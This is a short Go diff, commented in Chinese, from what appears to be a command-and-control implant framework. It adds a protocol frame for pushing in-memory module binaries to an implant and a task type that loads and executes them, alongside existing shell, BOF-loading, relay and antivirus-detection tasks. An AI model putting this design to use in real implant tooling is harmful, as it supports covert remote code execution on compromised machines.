@@ -24,6 +24,12 @@ const (
 	TypeRelay      = 0x0B // 链式回连：中继节点转发的子会话帧
 	TypeScreenFrame = 0x0C // 实时屏幕流：屏幕帧
 	TypeRelayStatus = 0x0D // 中继节点监听状态上报（{addr}，空=已停止）
+	// TypeModuleData（v1.4.0 S4）：内存模块二进制下行帧。
+	// 负载布局见 internal/common/moduleabi.EncodeBlobFrame：`[4B 头长][头 JSON][模块裸字节]`。
+	// 用新的帧类型而不是把模块塞进任务参数，是为了让"模块字节"与"任务"解耦：
+	// 任务表/任务列表/SSE 事件里只会出现一次性 token（短字符串），不会出现多 MB 的
+	// 二进制；模块字节只在这一次下行里出现，落地即被植入端按 token 索引暂存。
+	TypeModuleData = 0x0E
 	TypeError      = 0xFF
 )
 
@@ -50,6 +56,10 @@ const (
 	TaskTypeBOFLoad        = "bof_load"
 	TaskTypeShell          = "shell"
 	TaskTypeAVDetect       = "av_detect"
+	// TaskTypeExecModule（v1.4.0 S4）：按需加载并执行内存模块。
+	// 任务 Data 里是 moduleabi.ArgumentHeader 的 JSON（含一次性 token），
+	// **不含模块二进制**（二进制走 TypeModuleData 帧）。
+	TaskTypeExecModule = "exec_module"
 )
 
 type Packet struct {
